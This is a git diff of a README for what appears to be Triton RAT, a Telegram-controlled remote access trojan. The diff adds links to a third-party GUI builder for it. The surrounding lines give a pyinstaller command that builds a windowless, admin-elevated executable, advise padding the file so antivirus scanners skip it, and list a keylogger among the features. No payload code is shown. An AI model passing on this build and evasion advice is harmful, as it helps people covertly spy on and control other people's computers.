@@ -27,6 +27,7 @@ I'm not responding for your action!
 
 **With this tool you can control with YOUR pc remotly using telegram**
 That you need only hand (2 optional) , exe file that you will get from pyinstaller and telegram account
+You can also build exe with builder. <h3>Triton RAT GUI Builder: <a href="https://github.com/jayjayQy42/Triton_RAT-gui">Triton_RAT-gui</a></h3>
 
 <p align="left"> <a href="https://twitter.com/" target="blank"><img src="https://img.shields.io/twitter/follow/?logo=twitter&style=for-the-badge" alt="" /></a> </p>
 
@@ -100,7 +101,12 @@ $ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden
 $ run exe and bot started! 
 
 
+
 ```
+You can also build exe with gui builder:
+<h4>Triton RAT GUI Builder: <a href="https://github.com/jayjayQy42/Triton_RAT-gui">Triton_RAT-gui</a></h4>
+Thanks to [jayjayQy42](https://github.com/jayjayQy42)
+
 <h1 align="left">If you want to avoid scanning some antiviruses you can make that⬇️</h1>
 More online scanners and antiviruses also most popular online antivirus scanner virustotal's max allowed file size is 650 MB.
 Antiviruses, seeing the file size that it is large, will stupidly not check it! and you will be cool man.
@@ -211,6 +217,12 @@ Antiviruses, seeing the file size that it is large, will stupidly not check it! 
 ## Antivirus check (with help of second obfuscation(minifying) method (i wrote about that⬆️)) ##
 ![Снимок экрана (26)](https://github.com/user-attachments/assets/1e5020f4-207a-4125-81be-a98371923f02)
 
+## 🏗️ Triton_Rat_Gui Builder (Huge thanks to [jayjayQy42](https://github.com/jayjayQy42)):  ##
+<h3>Triton RAT GUI Builder: <a href="https://github.com/jayjayQy42/Triton_RAT-gui">https://github.com/jayjayQy42/Triton_RAT-gui</a></h3>
+<h3>This man created builder for Triton rat, don't forget support him also!</h3>
+
+
+
 ## Triton_Rat V2 update features: ##
 - **New interface and desing**
 - **Added more than 10 new functions(also keylogger,metadata ,pc info and etc...)**
@@ -219,9 +231,9 @@ Antiviruses, seeing the file size that it is large, will stupidly not check it! 
 
 
 
-
-
 ## :memo: License ##
 
 This project is licensed under the MIT License. For more details, please refer to the [LICENSE](LICENSE.md) file.
+
+<h1>🙏🏻 Thanks to everyone who supported this project with stars! Thank you all very much!</h1>
 
